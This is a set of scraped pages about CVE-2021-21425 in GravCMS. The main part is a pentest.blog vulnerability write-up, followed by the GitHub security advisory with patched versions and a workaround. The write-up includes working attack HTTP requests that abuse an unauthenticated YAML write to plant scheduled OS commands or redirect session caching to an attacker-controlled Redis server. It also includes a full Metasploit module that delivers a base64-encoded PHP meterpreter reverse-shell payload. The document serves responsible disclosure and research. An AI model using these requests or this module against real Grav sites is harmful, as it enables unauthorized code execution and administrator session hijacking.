=== Content from packetstormsecurity.com_845dfe8d_20250114_203319.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

¬†[About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from pentest.blog_b6f2f09a_20250114_203322.html ===

[Skip to main content](#content)
[![Pentest Blog](https://pentest.blog/wp-content/uploads/pentestblog-color-e1508706802866.png)](https://pentest.blog/)

Toggle navigation

* [Advisories](https://pentest.blog/category/advisories/)
* [Operating System](https://pentest.blog/category/operating-system/)
* [Application Security](https://pentest.blog/category/application-security/)
* [Network](https://pentest.blog/category/network/)
* [Tools](https://pentest.blog/category/tools/)
* [Article Series](https://pentest.blog/article-series/)
* [About Us](https://pentest.blog/about-us/)

![](https://pentest.blog/wp-content/uploads/gravcms-750x410.jpg)
# Unexpected Journey #7 ‚Äì GravCMS Unauthenticated Arbitrary YAML Write/Update leads to Code Execution (CVE-2021-21425)

 [March 19, 2021April 9, 2021](https://pentest.blog/unexpected-journey-7-gravcms-unauthenticated-arbitrary-yaml-write-update-leads-to-code-execution/)  [Mehmet Ince](https://pentest.blog/author/mehmet-ince/)
[Application Security](https://pentest.blog/category/application-security/)

It has been a while since I haven‚Äôt published a post on our beloved blog. Today I would like to share technical details and POC for a pretty funny vulnerability that I‚Äôve found at GravCMS.

As I‚Äôve been saying since 2015, my pentest team and I love to chase after 0days during penetration test engagements. This time we come across a GravCMS during the external OSINT process.

> Grav is a¬†Fast,¬†Simple, and¬†Flexible, file-based Web-platform. There is¬†Zero¬†installation required. Just extract the ZIP archive, and you are already up and running.

Of course, It‚Äôs yet another chance to give a shot for 0day hunting for us. You will be reading the steps that we encounter during research.

### Bypassing the Administrator Page Protection

I knew that we are not going to find any low-hanging fruit. I can not share our client‚Äôs name, but I can freely say that they have a very talented, young, and highly motivated security team.

When we identified GravCMS, I knew that they already took some precautions to reduce the attack vector. I immediately verified my assumption by realizing that we can not access the¬†**/admin**¬†endpoint. Further analysis has revealed that the protection took place via load-balancer.

I worked on a lot of frameworks in the past. Whenever I see a URI-based black/whitelisting protection on load-balancer, I always remember route components of the frameworks. In that case, our target was also using the¬†**langswitcher**plug-in of the GravCMS. Just by visiting the following URL, you can easily switch between different languages.

**http://www.x.com/en/**

**http://www.y.com/tr/**

But the question is, how did it know which language is requested? Does it perform a URI parsing? If yes, how does it decided which controller and the corresponding method will be executed?

Taking a minute and reading the source-code has answered all the questions that I have in my mind.

**http://www.x.com/en/some-page-on-the-site**

For example, whenever the GravCMS receives the above URI, the¬†**langswitcher**kicks in and decides the language package by parsing the ‚Äú**/en/‚Äù**part. The rest of the framework keeps working with the remaining portion of the URI, which is¬†**/some-page-on-the-site**¬†.

That means we can access the /admin path, which gives us an enormous attack surface just by visiting the following URL.

**http://www.x.com/en/admin**

Load-balancer will see /en/admin instead of /admin (LB does not perform ‚Äúcontain‚Äù operation over the URI). When the framework receives the /en/admin path, we will be executing methods within the administrator controller!

### GravCMS Method Invocation and Targeting Unprotected Methods

As I said before, I worked on a lot of frameworks in the past. It‚Äôs always been fascinating to read source-code and learn developer‚Äôs code designs and architecture. The following code piece is taken from the¬†**AdminBaseController.php**file.

```
    public function execute()
    {
        if (in_array($this->view, $this->blacklist_views, true)) {
            return false;
        }

        if (!$this->validateNonce()) {
            return false;
        }

        $method = 'task' . ucfirst($this->task);

        if (method_exists($this, $method)) {
            try {
                $response = $this->{$method}();
            } catch (RequestException $e) {
                // .... OMITTED CODE ....
            } catch (\RuntimeException $e) {
                // .... OMITTED CODE ....
            }
        } else {
            $response = $this->grav->fireEvent('onAdminTaskExecute',
                new Event(['controller' => $this, 'method' => $method]));
        }

        // .... OMITTED CODE ....
        return $response;
    }

```

As you can see above, the `$method` variable, which will be dynamically called, is populated by `$this->task` variable. I don‚Äôt want to share the full function calls how the frameworks perform that assignment, but the `$this->task` variable is controlled by the user via POST parameter.

So that means the user can execute any function name that begins with the **‚Äútask‚Äù**. Let‚Äôs see how many methods we have within the AdminController class, starting with **‚Äútask‚Äù**.

```
root@r:~plugin: cat AdminController.php |grep 'function task'
    protected function taskKeepAlive(): void
    protected function taskClearCache()
    public function taskSave()
    protected function taskSaveDefault()
    protected function taskLogin()
    protected function taskTwofa()
    protected function taskLogout()
    public function taskRegenerate2FASecret()
    public function taskReset()
    protected function taskForgot()
    protected function taskSaveUser()
    protected function taskGetNotifications(): void
    protected function taskHideNotification()
    protected function taskGetNewsFeed(): void
    protected function taskBackup()
    protected function taskBackupDelete()
    public function taskEnable()
    public function taskDisable()
    public function taskActivate()
    public function taskUpdategrav()
    public function taskUninstall()
    protected function taskGpmRelease()
    protected function taskGetUpdates()
    protected function taskGetPackagesDependencies()
    protected function taskInstallDependenciesOfPackages()
    protected function taskInstallPackage($reinstall = false)
    protected function taskRemovePackage(): void
    protected function taskReinstallPackage()
    protected function taskDirectInstall()
    public function taskSaveNewFolder()
    protected function taskSavePage()
    protected function taskCopy()
    protected function taskReorder()
    protected function taskDelete()
    protected function taskSwitchlanguage()
    protected function taskSaveas()
    public function taskContinue()
    protected function taskGetLevelListing(): ResponseInterface
    protected function taskGetChildTypes()
    protected function taskFilterPages()
    protected function taskProcessMarkdown()
    protected function taskListmedia()
    protected function taskAddmedia()
    protected function taskCompileScss()
    protected function taskExportScss()
    protected function taskDelmedia()
    protected function taskConvertUrls(): ResponseInterface
```
#### Authentication and Permission Checks

I have written about my thoughts about the correct approach to these kinds of validations. Please feel free to take your time and read it if you want üôÇ

<https://pentest.blog/why-secure-design-matters-secure-approach-to-session-validation-on-modern-frameworks-django-solution/>

Let‚Äôs have a look at one of the AdminController methods. The following method can be executed because it‚Äôs being placed within AdminController class and begins with ‚Äútask‚Äù.

```
    public function taskSave()
    {
        if (!$this->authorizeTask('save', $this->dataPermissions())) {
            return false;
        }

        $this->grav['twig']->twig_vars['current_form_data'] = (array)$this->data;

        switch ($this->view) {
            case 'pages':
                return $this->taskSavePage();
            case 'user':
                return $this->taskSaveUser();
            default:
                return $this->taskSaveDefault();
        }
    }
```

So first thing it does is validating permission. If you go ahead and checkout remaining methods, you will see `$this->authorizeTask` function call as a first thing. But the question is, what can happen if the developer forgot to call it ???

## Unauthenticated Arbitrary YAML Write

Thanks to IDEs *-I love PhpStorm for especially reviewing PHP projects-* we can quickly go over all the functions I‚Äôve identified in the previous section.

The following function caught my attention for obvious reasons. Depends on the naming convention of the variables, it somehow reloads the config file. Plus, it does NOT perform a permission check, and the function name begins with ‚Äútask‚Äù!

```
    protected function taskSaveDefault()
    {
        // Handle standard data types.
        $type = $this->getDataType();
        $obj = $this->admin->getConfigurationData($type, $this->data);

        try {
            $obj->validate();
        } catch (\Exception $e) {
            // ... OMITTED ...
        }

        $obj->filter(false, true);

        $obj = $this->storeFiles($obj);

        if ($obj) {
            // Event to manipulate data before saving the object
            $this->grav->fireEvent('onAdminSave', new Event(['object' => &$obj]));
            $obj->save();
            $this->admin->setMessage($this->admin::translate('PLUGIN_ADMIN.SUCCESSFULLY_SAVED'), 'info');
            $this->grav->fireEvent('onAdminAfterSave', new Event(['object' => $obj]));
        }

        $config = $this->grav['config'];
        $config->reload();

        return true;
    }
```

It‚Äôs essential to understand the purpose of that specific method. So we have to understand `getDataType()` and `getConfigurationData()` methods.

```
    protected function getDataType()
    {
        return trim("{$this->view}/{$this->admin->route}", '/');
    }
```

Straightforward and clean code. It returns a value from the URI. We can control it, and it will be used as a data type for the rest of the execution.

`getConfigurationData()` has 107 line of code. For that reason, I don‚Äôt want to copy full codes in here. I took only important parts of it that will help you to understand what it does.

```
    public function getConfigurationData($type, array $post = null)
    {
        static $data = [];

        if (isset($data[$type])) {
            return $data[$type];
        }

        // ... OMMITED ...

        $locator  = $this->grav['locator'];
        $filename = $locator->findResource("config://{$type}.yaml", true, true);
        $file     = CompiledYamlFile::instance($filename);

        if (preg_match('|plugins/|', $type)) {
            // ... OMMITED ...
        } elseif (preg_match('|themes/|', $type)) {
            // ... OMMITED ...
        } elseif (preg_match('|users?/|', $type)) {
            // ... OMMITED ...
        } elseif (preg_match('|config/|', $type)) {
            $type       = preg_replace('|config/|', '', $type);
            $blueprints = $this->blueprints("config/{$type}");

            $config = $this->grav['config'];
            $obj = new Data\Data($config->get($type, []), $blueprints);
            if ($post) {
                $obj = $this->mergePost($obj, $post);
            }

            // FIXME: We shouldn't allow user to change configuration files in system folder!
            $filename = $this->grav['locator']->findResource("config://{$type}.yaml")
                ?: $this->grav['locator']->findResource("config://{$type}.yaml", true, true);
            $file     = CompiledYamlFile::instance($filename);
            $obj->file($file);
            $data[$type] = $obj;
        } elseif (preg_match('|media-manager/|', $type)) {
           // ... OMMITED ...
            $data[$type] = $obj;
        } else {
            throw new \RuntimeException("Data type '{$type}' doesn't exist!");
        }

        return $data[$type];
    }
```

Please look at the lines between 31-34. If the `$type` matches with the **‚Äúconfig/‚Äù**, it takes POST data and then finds the corresponding YAML file and updates its content! It does the same operation for other YAML files under the users/, plugins/ or media-manager/ folders.

That means we can write anything we want into the YAML files. Those are under the config folder are responsible for system configuration !

We have unauthenticated arbitrary YAML file write/update vulnerability !

#### Proof of Concept

In order to proof that we can update YAML file, I would like to show you how to change web-site title üôÇ

1 ‚Äì Go to http://target/admin URL.

2 ‚Äì Get cookie and extract admin-nonce value from login form.

3- Perform following POST request.

![](https://pentest.blog/wp-content/uploads/poc-1024x371.jpg)

Even though we see a login page, we have a result message of the update operation. Go ahead and check the home-page of the GravCMS. A title is being changed to the string we have given.

### #1 Way to Remote Code Execution ‚Äì Scheduler

We can change almost every single YAML file within the project. Yet, we need to find a way to RCE.

GravCMS has a built-in scheduler feature, which gives you the ability to defined operating system command and execution periods. Of course, scheduler information is also stored within the corresponding YAML file.

Following HTTP request is defining new command that will be executed every minute.

```
POST /admin/config/scheduler HTTP/1.1
Host: 192.168.179.131
Content-Length: 348
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.179.131
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.179.131/admin/forgot
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: grav-site-1dfbe94-admin=s2pca2cleqg78u8iit6v593h60
Connection: close

task=SaveDefault&data%5Bcustom_jobs%5D%5Bmdisec21%5D%5Bcommand%5D=/usr/bin/echo
&data%5Bcustom_jobs%5D%5Bmdisec21%5D%5Bargs%5D=1337
&data%5Bcustom_jobs%5D%5Bmdisec21%5D%5Bat%5D=*+*+*+*+*
&data%5Bcustom_jobs%5D%5Bmdisec21%5D%5Boutput%5D=/tmp/1.txt
&data%5Bcustom_jobs%5D%5Bmdisec21%5D%5Boutput_mode%5D=append
&admin-nonce=b78bb0a12604579896f9b4796dde8833
```

There is nothing fancy in here. It‚Äôs a feature! We execute the echo command with a 1337 parameter, and output will be written into the /tmp/1.txt file.

### #2 Way to Remote Code Execution ‚Äì Redis as a Cache Service

The default configuration of the GravCMS is choosing caching method automatically. But we can define the Redis connection string in the system YAML file. That will tell the GravCMS to use the given Redis service to store cache and session information!

By abusing the same vulnerability, we can tell GravCMS to use the Redis üôÇ All we need to is as follow:

1 ‚Äì Fire up an EC2 instance.
2 ‚Äì Install Redis service.
3 ‚Äì Change the configuration of the Redis so that it can be accessible from the internet.
4 ‚Äì Send the following HTTP request to your target.
5 ‚Äì Run ‚Äúredis-cli monitor‚Äù command to see incoming data.
6 ‚Äì Find out administrator sessions key
7 ‚Äì Become an admin !
8 ‚Äì Go to /admin/tools/direct-install and upload your own custom GravCMS plug-in that contains your payload.

## Metasploit Module

For those who loves to automate stuff ^^

```
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
    Rank = ExcellentRanking

    include Msf::Exploit::Remote::HttpClient

    def initialize(info={})
      super(update_info(info,
        'Name'           => 'GravCMS Remote Command Execution',
        'Description'    => %q{
          Bla bla bla
        },
        'License'         => MSF_LICENSE,
        'Author'          =>
          [
            'Mehmet Ince <[[email¬†protected]](/cdn-cgi/l/email-protection)>'  # author & msf module
          ],
        'References'      =>
          [
            ['URL', 'https://pentest.blog/unexpected-journey-7-gravcms-unauthenticated-arbitrary-yaml-write-update-leads-to-code-execution/']
          ],
        'Privileged'      => true,
        'Platform'        => ['php'],
        'Arch'            => ARCH_PHP,
        'DefaultOptions'  =>
          {
            'payload' => 'php/meterpreter/reverse_tcp',
            'WfsDelay' => 90
          },
        'Targets'         => [ ['Automatic', {}] ],
        'DisclosureDate'  => '2021-04-08',
        'DefaultTarget'   => 0
      ))

    end

    def exract_cookie_token
        print_status 'Sending request to the admin path to generate cookie and token'
        res = send_request_cgi(
            'method' => 'GET',
            'uri' => normalize_uri(target_uri.path, 'admin'),
        )

        # Cookie must contain grav-site-az09-admin and admin-nonce form field must contain value
        if res && res.get_cookies =~ /grav\-site\-[a-z0-9]+\-admin=(\S*);/ && !res.get_hidden_inputs.first['admin-nonce'].nil?
            print_good 'Cookie and CSRF token successfully extracted !'
        else
            fail_with Msf::Module::Failure::NotFound, 'The server sent a response, but cookie and token was not found.'
        end

        @cookie = res.get_cookies
        @admin_nonce = res.get_hidden_inputs.first['admin-nonce']

    end

    def exploit
        exract_cookie_token

        task_name = Rex::Text.rand_text_alpha_lower(5)

        p = Base64.strict_encode64(payload.encoded)

        print_status 'Implanting payload via scheduler feature'

        res = send_request_cgi(
            'method' => 'POST',
            'uri' => normalize_uri(target_uri.path, 'admin', 'config', 'scheduler'),
            'cookie' => @cookie,
            'vars_post'=> {
                'admin-nonce' => @admin_nonce,
                'task' => 'SaveDefault',
                "data[custom_jobs][#{task_name}][command]"=> '/usr/bin/php',
                "data[custom_jobs][#{task_name}][args]"=> "-r eval(base64_decode(\"#{p}\"));",
                "data[custom_jobs][#{task_name}][at]"=> '* * * * *',
                "data[custom_jobs][#{task_name}][output]"=> '',
                "data[status][#{task_name}]" => 'enabled',
                "data[custom_jobs][#{task_name}][output_mode]"=> 'append'
            }
        )

        if res && res.code == 200 && res.body.include?('Successfully saved')
            print_good 'Scheduler successfully created ! Wait for 1 minute...'
        end

    end
  end

```
```
POST /admin/config HTTP/1.1
Host: 192.168.179.131
Content-Length: 348
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.179.131
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.179.131/admin/forgot
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: grav-site-1dfbe94-admin=s2pca2cleqg78u8iit6v593h60
Connection: close

task=SaveDefault&data[cache][driver]=redis&data[cache][prefix]=g
&data[cache][redis][socket]=0
&data[cache][redis][server]=127.0.0.1
&data[cache][redis][port]=6379
&data[cache][redis][password]=
&data[cache][redis][database]=&admin-nonce=c585b362bb7b38ae0d0852efbb152dda
```
### Timeline

18 March 2021 17:11 GMT + 3 : Starting vulnerability research

18 March 2021 17:40 GMT + 3 : Found the vulnerability

18 March 2021 18:53 GMT + 3 : Starting to find a way to achieve an RCE.

19 March 2021 01:10 GMT + 3 : Finishing research.

19 March 2021 14:00 GMT + 3 : Reporting 0day to the client.

19 March 2021 14:25 GMT + 3 : Special routing rule defined by the client in order to avoid access to the admin page.

19 March 2021 19:02 GMT + 3 : Getting touch with core developer via Discord.

19 March 2021 19:54 GMT + 3 : Hot fix for YAML write/update vulnerability.

22 March 2021 20:00 GMT + 3 : Update from the maintainer. They have told us that they are working on proper fix.

25 March 2021 21:12 GMT + 3 : Another update from the maintainer. They are still working on the proper fix. Also they identified similar vulnerabilities while working on proper fix.

06 April 2021 : Release GetGrav 1.7.10

08 April 2021 : Public disclosure

[0day](https://pentest.blog/tag/0day/) [exploit](https://pentest.blog/tag/exploit/) [php](https://pentest.blog/tag/php/)

![](https://secure.gravatar.com/avatar/a02c8481b3d29584e05195893e584b61?s=60&d=monsterid&r=g)

#### [Mehmet Ince](https://pentest.blog/author/mehmet-ince/)

Master Ninja @ Prodaft / INVICTUS Europe.

## Post navigation

 [Vesta Control Panel Second Order Remote Code Execution 0day Step-by-Step Analysis](https://pentest.blog/vesta-control-panel-second-order-remote-code-execution-0day-step-by-step-analysis/)[Pardus 21 Linux Distro ‚Äì Remote Code Execution 0day 2021 CVE-2021-3806](https://pentest.blog/pardus-21-linux-distro-remote-code-execution-0day-2021/)

Search for:

### PRODAFT Cyber Intelligence and Cyber Security Services

[![](https://pentest.blog/wp-content/uploads/Mg6EYwIk_400x400.jpg)](https://www.invictuseurope.com/)

### Recent Posts

* [Advisory | NetModule Router Software Race Condition Leads to Remote Code Execution](https://pentest.blog/advisory-netmodule-router-software-race-condition-leads-to-remote-code-execution/)
* [Advisory | Roxy-WI Unauthenticated Remote Code Executions CVE-2022-31137](https://pentest.blog/advisory-roxy-wi-unauthenticated-remote-code-executions-cve-2022-31137/)
* [Advisory | GLPI Service Management Software Multiple Vulnerabilities and Remote Code Execution](https://pentest.blog/advisory-glpi-service-management-software-sql-injection-remote-code-execution-and-local-file-inclusion/)
* [LiderAhenk 0day ‚Äì All your PARDUS Clients Belongs To Me (CVE-2021-3825)](https://pentest.blog/liderahenk-0day-all-your-pardus-clients-belongs-to-me/)
* [Pardus 21 Linux Distro ‚Äì Remote Code Execution 0day 2021 CVE-2021-3806](https://pentest.blog/pardus-21-linux-distro-remote-code-execution-0day-2021/)
### Latest Comments

* [Ege Balci](https://github.com/EgeBalci) on [Art of Anti Detection 3 ‚Äì Shellcode Alchemy](https://pentest.blog/art-of-anti-detection-3-shellcode-alchemy/#comment-1244)
* Chase Run Taylor on [Art of Anti Detection 1 ‚Äì Introduction to AV & Detection Techniques](https://pentest.blog/art-of-anti-detection-1-introduction-to-av-detection-techniques/#comment-1243)
* [Mehmet ƒ∞nce](http://www.mehmetince.net/) on [Unexpected Journey #4 ‚Äì Escaping from Restricted Shell and Gaining Root Access to SolarWinds Log & Event Manager (SIEM) Product](https://pentest.blog/unexpected-journey-4-escaping-from-restricted-shell-and-gaining-root-access-to-solarwinds-log-event-manager-siem-product/#comment-1242)
* 0x00 on [Unexpected Journey #4 ‚Äì Escaping from Restricted Shell and Gaining Root Access to SolarWinds Log & Event Manager (SIEM) Product](https://pentest.blog/unexpected-journey-4-escaping-from-restricted-shell-and-gaining-root-access-to-solarwinds-log-event-manager-siem-product/#comment-1241)
* [Mehmet ƒ∞nce](http://www.mehmetince.net/) on [Unexpected Journey #4 ‚Äì Escaping from Restricted Shell and Gaining Root Access to SolarWinds Log & Event Manager (SIEM) Product](https://pentest.blog/unexpected-journey-4-escaping-from-restricted-shell-and-gaining-root-access-to-solarwinds-log-event-manager-siem-product/#comment-1240)
### Tags

[0day](https://pentest.blog/tag/0day/)
[1day](https://pentest.blog/tag/1day/)
[advisory](https://pentest.blog/tag/advisory/)
[alienvault](https://pentest.blog/tag/alienvault/)
[android](https://pentest.blog/tag/android/)
[application](https://pentest.blog/tag/application/)
[assembly](https://pentest.blog/tag/assembly/)
[bof](https://pentest.blog/tag/bof/)
[burp](https://pentest.blog/tag/burp/)
[bypass](https://pentest.blog/tag/bypass/)
[crypter](https://pentest.blog/tag/crypter/)
[decoder](https://pentest.blog/tag/decoder/)
[dns](https://pentest.blog/tag/dns/)
[EMET](https://pentest.blog/tag/emet/)
[encoder](https://pentest.blog/tag/encoder/)
[exploit](https://pentest.blog/tag/exploit/)
[hook](https://pentest.blog/tag/hook/)
[iat](https://pentest.blog/tag/iat/)
[icmp](https://pentest.blog/tag/icmp/)
[in-memory](https://pentest.blog/tag/in-memory/)
[IOT](https://pentest.blog/tag/iot/)
[linux](https://pentest.blog/tag/linux/)
[malware](https://pentest.blog/tag/malware/)
[metasploit](https://pentest.blog/tag/metasploit/)
[multi-stage](https://pentest.blog/tag/multi-stage/)
[nas](https://pentest.blog/tag/nas/)
[packer](https://pentest.blog/tag/packer/)
[php](https://pentest.blog/tag/php/)
[ransomware](https://pentest.blog/tag/ransomware/)
[rce](https://pentest.blog/tag/rce/)
[reflective](https://pentest.blog/tag/reflective/)
[research](https://pentest.blog/tag/research/)
[reverse](https://pentest.blog/tag/reverse/)
[reversing](https://pentest.blog/tag/reversing/)
[secure coding](https://pentest.blog/tag/secure-coding/)
[securityonion](https://pentest.blog/tag/securityonion/)
[self-defence](https://pentest.blog/tag/self-defence/)
[shellcode](https://pentest.blog/tag/shellcode/)
[siem](https://pentest.blog/tag/siem/)
[sql injection](https://pentest.blog/tag/sql-injection/)
[sqlmap](https://pentest.blog/tag/sqlmap/)
[stager](https://pentest.blog/tag/stager/)
[storage](https://pentest.blog/tag/storage/)
[tunneling](https://pentest.blog/tag/tunneling/)
[windows](https://pentest.blog/tag/windows/)
### Awarded Top 15 Pentest Blog

[![Pentest Blogs](/wp-content/uploads/pentest_1000px.png)](https://blog.feedspot.com/pentest_blogs/ "Pentest Blogs")

INVICTUS Cyber Security & Intelligence Services | Theme by [Colorlib](http://colorlib.com/) Powered by [WordPress](http://wordpress.org/)



=== Content from github.com_dad73a2e_20250114_203321.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgetgrav%2Fgrav-plugin-admin%2Fsecurity%2Fadvisories%2FGHSA-6f53-6qgv-39pj)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgetgrav%2Fgrav-plugin-admin%2Fsecurity%2Fadvisories%2FGHSA-6f53-6qgv-39pj)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=getgrav%2Fgrav-plugin-admin)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[getgrav](/getgrav)
/
**[grav-plugin-admin](/getgrav/grav-plugin-admin)**
Public

* [Notifications](/login?return_to=%2Fgetgrav%2Fgrav-plugin-admin) You must be signed in to change notification settings
* [Fork
  231](/login?return_to=%2Fgetgrav%2Fgrav-plugin-admin)
* [Star
   356](/login?return_to=%2Fgetgrav%2Fgrav-plugin-admin)

* [Code](/getgrav/grav-plugin-admin)
* [Issues
  415](/getgrav/grav-plugin-admin/issues)
* [Pull requests
  7](/getgrav/grav-plugin-admin/pulls)
* [Actions](/getgrav/grav-plugin-admin/actions)
* [Projects
  0](/getgrav/grav-plugin-admin/projects)
* [Security](/getgrav/grav-plugin-admin/security)
* [Insights](/getgrav/grav-plugin-admin/pulse)

Additional navigation options

* [Code](/getgrav/grav-plugin-admin)
* [Issues](/getgrav/grav-plugin-admin/issues)
* [Pull requests](/getgrav/grav-plugin-admin/pulls)
* [Actions](/getgrav/grav-plugin-admin/actions)
* [Projects](/getgrav/grav-plugin-admin/projects)
* [Security](/getgrav/grav-plugin-admin/security)
* [Insights](/getgrav/grav-plugin-admin/pulse)

# Unauthenticated Arbitrary YAML Write/Update leads to Code Execution

Critical

[rhukster](/rhukster)
published
GHSA-6f53-6qgv-39pj
Apr 6, 2021

## Package

Grav Admin Plugin
(PHP)

## Affected versions

<= 1.10.7

## Patched versions

1.10.8

## Description

### Vulnerability

An unauthenticated user can execute some methods of administrator controller without needing any credentials. Particular method execution will result in arbitrary YAML file creation or content change of existing YAML files on the system.

### Impact

Successfully exploitation of that vulnerability results in configuration changes, such as general site information change, custom scheduler job definition, etc. Due to the nature of the vulnerability, an adversary can change some part of the webpage, or hijack an administrator account, or execute operating system command under the context of the web-server user.

### Workarounds

Blocking access to the `/admin` path from untrusted sources can be applied as a workaround.

### References

<https://pentest.blog/unexpected-journey-7-gravcms-unauthenticated-arbitrary-yaml-write-update-leads-to-code-execution/>

At the time of this report, the above URL that contains technical details about the vulnerability is password protected. Password is shared with the only core development team as a part of the responsible disclosure process.

### Severity

Critical

### CVE ID

CVE-2021-21425

### Weaknesses

[CWE-284](/advisories?query=cwe%3A284)

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from packetstormsecurity.com_1c6747ad_20250114_203320.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

¬†[About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)


